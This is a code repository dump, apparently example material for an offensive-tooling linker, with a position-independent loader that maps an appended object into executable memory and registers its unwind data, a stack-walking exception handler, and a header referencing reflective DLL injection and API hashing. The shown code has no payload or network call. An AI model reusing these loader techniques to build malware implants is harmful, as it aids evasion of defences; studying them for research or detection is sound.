OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_unwind/loader.spec

```text
#
# Generate and use .pdata for PIC and PICOs
#

x64:
	load "bin/loader.x64.o"
		make pic +gofirst +optimize

		# bring in our services module and merge LibTCG
		run "../simple_pic/services.spec"
		mergelib "../libtcg/libtcg.x64.zip"

		# our object passed to this .spec to turn into a PICO
		push $OBJECT
			# +unwind generates .pdata/.xdata and makes it available to the loader
			make object +optimize +unwind
			export
			link "my_data"

		# link generated PIC unwind info to section pdata AFTER these linker steps
		linkpost "functable" "unwind"

		export

```

## File: simple_unwind/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -fno-omit-frame-pointer -mno-omit-leaf-frame-pointer -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x64

bin:
	mkdir -p bin

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/loader.c -o bin/loader.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/verify.c -o bin/verify.x64.o

clean:
	rm -rf bin

```

## File: simple_unwind/verify.spec

```text
#
# A validation module/configuration script for our simpleunwind demonstration
#
processpic.x64:
	# let's merge in verify.x64.o in our PICO loading PIC
	load "bin/verify.x64.o"
		merge

	# let's designate MyHandler as the "language-specific exception" handler for go. This will
	# allow us to "catch" the PICO's debug break when it happens. This requires that our PIC's
	# stack unwinding meta-information is registered with the OS (e.g., RtlAddFunctionTable)
	catch "go" "MyHandler"

x64:
	# let's drop an int3 (debug break) before a call to MessageBoxA in our PICO
	pack $INT3 "b" 0xcc
	before "export" "object" : ised insert "mov rax, qword ptr [__imp_USER32$MessageBoxA]" $INT3 +before

	# call the local (to this file) label processpic before we export PIC
	before "export" "pic" : callnear "verify.spec" "processpic"

```

## File: simple_unwind/src/loader.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

DECLSPEC_IMPORT BOOLEAN WINAPI KERNEL32$RtlAddFunctionTable(PRUNTIME_FUNCTION FunctionTable, DWORD EntryCount, ULONG_PTR BaseAddress);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __BOFDATA__[0] __attribute__((section("my_data")));

char * findAppendedPICO() {
	return (char *)&__BOFDATA__;
}

/*
 * This is the stack unwind information generated by CPL's +unwind and linked with linkpost
 */
_RESOURCE pdata __attribute__((section("functable")));

/*
 * Our PICO loader, have fun, go nuts!
 */
void go() {
	char        * dstCode;
	char        * dstData;
	char        * src;
	IMPORTFUNCS   funcs;

	/* register this PIC's .pdata */
	KERNEL32$RtlAddFunctionTable((PRUNTIME_FUNCTION)pdata.value, pdata.length / sizeof(RUNTIME_FUNCTION), (ULONG_PTR)go);

	/* find our DLL appended to this PIC */
	src = findAppendedPICO();

	/* allocate memory for our PICO */
	dstCode = KERNEL32$VirtualAlloc( NULL, PicoCodeSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );
	dstData = KERNEL32$VirtualAlloc( NULL, PicoDataSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );

	/* setup our IMPORTFUNCS data structure */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* load our pico into our destination address, thanks! */
	PicoLoad(&funcs, src, dstCode, dstData);

	/* register our PICO's .pdata with the operating system */
	_RESOURCE * pico_pdata = (_RESOURCE *)PicoGetUnwindData(src, dstCode);
	if (pico_pdata != NULL)
		KERNEL32$RtlAddFunctionTable((PRUNTIME_FUNCTION)pico_pdata->value, pico_pdata->length / sizeof(RUNTIME_FUNCTION), (ULONG_PTR)dstCode);

	/* execute our pico */
	PicoEntryPoint(src, dstCode) (NULL);
}

```

## File: simple_unwind/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_unwind/src/verify.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
#include <windows.h>
#include "tcg.h"

DECLSPEC_IMPORT PVOID             WINAPI NTDLL$RtlAddVectoredExceptionHandler(ULONG, PVECTORED_EXCEPTION_HANDLER);
DECLSPEC_IMPORT WINBOOL           WINAPI KERNEL32$ReadProcessMemory (HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
DECLSPEC_IMPORT PRUNTIME_FUNCTION WINAPI KERNEL32$RtlLookupFunctionEntry(DWORD64, PDWORD64, PVOID);
DECLSPEC_IMPORT PVOID             WINAPI KERNEL32$RtlVirtualUnwind(DWORD, DWORD64, DWORD64, PRUNTIME_FUNCTION, PCONTEXT, PVOID*, PDWORD64, PVOID*);

/* I had some help from Google Gemini with the basic walk */
EXCEPTION_DISPOSITION MyHandler(PEXCEPTION_RECORD ExceptionRecord, ULONG64 EstablisherFrame, PCONTEXT ContextRecord, PDISPATCHER_CONTEXT DispatcherContext) {
	if (ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
		CONTEXT * liveCtx = ContextRecord;
		CONTEXT   walkCtx = *ContextRecord;

		dprintf("Caught int3. Stack walk time!");

		for (int frameCount = 0; walkCtx.Rip != 0 && frameCount < 32; frameCount++) {
			ULONG64 rip = walkCtx.Rip;
			SIZE_T read;

			/* print our stack frame */
			dprintf("[%02d] %p", frameCount, rip);

			/* check if RIP is sane... terminate walk if it's not */
			if (!KERNEL32$ReadProcessMemory((HANDLE)-1, (LPCVOID)walkCtx.Rip, &rip, sizeof(PULONG64), &read)) {
				dprintf("Bad RIP! %p - Truncating stack walk", rip);
				break;
			}

			/* let's ask the OS for the .pdata information */
			ULONG64 imageBase;
			PRUNTIME_FUNCTION pFunctionEntry = KERNEL32$RtlLookupFunctionEntry(walkCtx.Rip, &imageBase, NULL);

			if (pFunctionEntry != NULL) {
				/* we found .pdata for this function, let's simulate the epilogue on walkCtx and find the next frame */
				PVOID handlerData;
				ULONG64 establisherFrame;
				KERNEL32$RtlVirtualUnwind(0, imageBase, walkCtx.Rip, pFunctionEntry, &walkCtx, &handlerData, &establisherFrame, NULL);
			}
			else {
				/* no .pdata? Assume it's a leaf and pop the return address off of the stack */
				walkCtx.Rip = *(PULONG64)(walkCtx.Rsp);
				walkCtx.Rsp += 8;
			}
		}

		/* advance rip to move past out int3 instruction */
		liveCtx->Rip += 1;

		/* this enum value is different from a VEH's long return value. Don't mistake the two */
		return ExceptionContinueExecution;
	}

	return ExceptionContinueSearch;
}

```

